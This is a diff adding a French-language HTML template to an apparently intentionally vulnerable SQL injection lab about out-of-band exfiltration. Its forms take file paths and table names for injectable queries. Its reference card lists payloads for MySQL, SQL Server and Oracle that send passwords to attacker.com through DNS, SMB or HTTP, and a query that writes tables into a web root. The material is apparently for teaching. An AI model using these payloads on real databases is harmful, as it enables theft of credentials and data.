@@ -1,0 +1,100 @@
+{% extends 'base.html' %}
+
+{% block title %}Out-of-band SQL Injection{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>Out-of-band via ATTACH DATABASE</h2>
+    <p>SQLite permet d'ecrire une base de donnees dans n'importe quel fichier accessible. Si ce fichier est dans un repertoire web, l'attaquant peut le telecharger!</p>
+
+    <form action="{{ prefix }}/outofband" method="post" class="search-form">
+        <input type="text" name="filepath" value="{{ filepath }}" placeholder="Chemin du fichier (ex: /tmp/stolen.db)...">
+        <input type="text" name="table" value="{{ table_to_steal }}" placeholder="Table a voler (ex: users)...">
+        <button type="submit">Exfiltrer</button>
+    </form>
+
+    {% if result %}
+    <div class="alert alert-success">
+        {{ result }}
+    </div>
+    {% endif %}
+
+    {% if query %}
+    <div class="query-display">
+        <strong>Requete executee:</strong><br>
+        {{ query }}
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Exfiltration simple (SELECT INTO FILE)</h2>
+    <p>Le nom de table est injecte directement - les resultats sont ecrits dans /tmp/extract_data.txt</p>
+
+    <form action="{{ prefix }}/outofband-extract" method="get" class="search-form">
+        <input type="text" name="table" value="{{ table_name }}" placeholder="Nom de la table (ex: users)...">
+        <button type="submit">Extraire</button>
+    </form>
+
+    {% if extract_result %}
+    <div class="alert alert-success">
+        {{ extract_result }}
+    </div>
+    {% endif %}
+
+    {% if extract_query %}
+    <div class="query-display">
+        <strong>Requete executee:</strong><br>
+        {{ extract_query }}
+    </div>
+    {% endif %}
+</div>
+
+<div class="card">
+    <h2>Vraies techniques Out-of-band (autres SGBD)</h2>
+    <p style="color: rgba(255,255,255,0.7);">Out-of-band = exfiltrer les donnees via un canal externe (DNS, HTTP) quand on ne peut pas voir le resultat directement.</p>
+
+    <h3 style="margin-top: 1rem; color: #ffd93d;">MySQL - DNS/HTTP Exfiltration</h3>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>SELECT LOAD_FILE(CONCAT('\\\\',password,'.attacker.com\\a')) FROM users</code></li>
+        <li style="margin-bottom: 0.5rem;">→ Envoie le password via une requete DNS vers attacker.com</li>
+        <li style="margin-bottom: 0.5rem;"><code>SELECT * INTO OUTFILE '/var/www/html/data.txt' FROM users</code></li>
+        <li style="margin-bottom: 0.5rem;">→ Ecrit les donnees dans un fichier web accessible</li>
+    </ul>
+
+    <h3 style="margin-top: 1rem; color: #ffd93d;">SQL Server - xp_dirtree</h3>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>EXEC master..xp_dirtree '\\attacker.com\share'</code></li>
+        <li style="margin-bottom: 0.5rem;">→ Declenche une requete DNS/SMB vers attacker.com</li>
+        <li style="margin-bottom: 0.5rem;"><code>DECLARE @p varchar(1024);SET @p=(SELECT password FROM users);EXEC('master..xp_dirtree "\\'+@p+'.attacker.com\a"')</code></li>
+    </ul>
+
+    <h3 style="margin-top: 1rem; color: #ffd93d;">Oracle - UTL_HTTP</h3>
+    <ul style="list-style: none; padding: 0;">
+        <li style="margin-bottom: 0.5rem;"><code>SELECT UTL_HTTP.REQUEST('http://attacker.com/'||password) FROM users WHERE rownum=1</code></li>
+        <li style="margin-bottom: 0.5rem;">→ Fait une requete HTTP avec le password dans l'URL</li>
+    </ul>
+</div>
+
+<div class="card">
+    <h2>Fichiers crees</h2>
+    {% if files %}
+    <ul style="list-style: none; padding: 0;">
+        {% for file in files %}
+        <li style="margin-bottom: 0.5rem; padding: 0.5rem; background: rgba(0,0,0,0.2); border-radius: 4px;">
+            <strong>{{ file.name }}</strong>
+            {% if file.content %}
+            <pre style="margin-top: 0.5rem; color: #51cf66;">{{ file.content }}</pre>
+            {% endif %}
+        </li>
+        {% endfor %}
+    </ul>
+    {% else %}
+    <p style="color: rgba(255,255,255,0.5);">Aucun fichier cree</p>
+    {% endif %}
+</div>
+
+{% if error %}
+<div class="alert alert-danger">{{ error }}</div>
+{% endif %}
+{% endblock %}
